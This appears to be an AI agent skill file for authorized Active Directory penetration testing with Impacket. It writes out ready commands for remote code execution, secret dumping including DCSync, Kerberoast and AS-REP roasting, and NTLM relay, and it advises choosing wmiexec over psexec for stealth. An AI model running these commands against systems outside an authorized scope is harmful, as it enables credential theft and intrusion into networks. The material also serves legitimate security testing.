---
name: impacket
description: >
  Use for AD/Windows protocol actions with the Impacket example scripts once you have creds or
  hashes (often from netexec) — RCE (psexec/wmiexec), credential dumping (secretsdump, incl. DCSync
  -just-dc), Kerberoast (GetUserSPNs -request), AS-REP roast (GetNPUsers -request), NTLM relay
  (ntlmrelayx). Feeds hashes to hashcat. Not for attack-path mapping (bloodhound) or web (burpsuite).
arguments: "action target [-u user] [-p pass] [-hashes LM:NT] [-dc-ip ip]"
model: inherit
effort: medium
context: inline
agent:
category: ad-network
domain: ad
---

# impacket — AD/Windows protocol tools (psexec · secretsdump · GetUserSPNs · ntlmrelayx)

Shared contract: see AGENTS.md.

## Goal
Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped secrets, or roastable
tickets — via the Impacket example scripts, capturing every artifact for the report + credential store.

## Steps
1. Set up the run dir per AGENTS.md (`$RUN`, `mkdir -p "$RUN/loot" "$RUN/notes"`); scope inherited from `out/<engagement>/scope.txt`. Target format `[[domain/]username[:password]@]<target>`; `-hashes LM:NT` for pass-the-hash, `-k`/`-no-pass` for Kerberos, `-dc-ip` for the DC. Creds often from `netexec`.
2. **Remote code exec:** `psexec.py 'DOMAIN/user:password@TARGET'` (SYSTEM, noisy service) or `wmiexec.py 'DOMAIN/user:password@TARGET'` (quieter); for pass-the-hash add `-hashes LMHASH:NTHASH` and omit the password. Tee to `run.log`.
3. **Credential dumping:** `secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"`; DCSync from a DC: `secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"`.
4. **Roasting → hashcat** (hashcat format): `GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"` and `GetNPUsers.py 'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt"`.
5. **NTLM relay (when applicable) + marker + run record:** `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` (`-i` interactive). Write a run marker (`no artifacts captured` if none), then `run.json`. Roast hashes feed `hashcat`; cracked creds loop back to `netexec`.

## Modern tooling & alternatives
Install via `pipx install impacket` (scripts as `psexec.py` or `impacket-psexec`). `netexec` wraps many
actions at scale; `certipy`/`rubeus` cover AD CS / Kerberos. Prefer `wmiexec`/`smbexec` over `psexec` for stealth.

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Engagement scope confirmed once in out/<engagement>/scope.txt (inherited, not re-confirmed); creds/hashes used are in scope
    verify: judge
    evidence: ../../scope.txt
    on_fail: fail
    required: true
  - id: action-executed
    desc: An impacket action ran and was logged (exec/dump/roast/relay)
    verify: nonempty
    evidence: run.log
    on_fail: redo-skill
    required: true
  - id: loot-captured
    desc: Artifacts (secrets/tickets/roast hashes) saved under loot/ via -outputfile
    verify: exists
    evidence: loot
    on_fail: redo-part
    required: false
  - id: results-recorded
    desc: Run marker written (even when no artifacts captured)
    verify: nonempty
    evidence: findings.md
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- Target format `[[domain/]username[:password]@]<target>`; pass-the-hash uses `-hashes LMHASH:NTHASH` (omit password); `-k`/`-no-pass` for Kerberos.
- `secretsdump -just-dc` is **DCSync** — needs replication rights, high-signal; dump the minimum. Request roast hashes with `-format hashcat` so they drop into `hashcat`.
- `psexec` creates a service (noisy/forensic); prefer `wmiexec`/`smbexec` when stealth matters. A run that captures nothing still writes `findings.md` ("no artifacts captured").
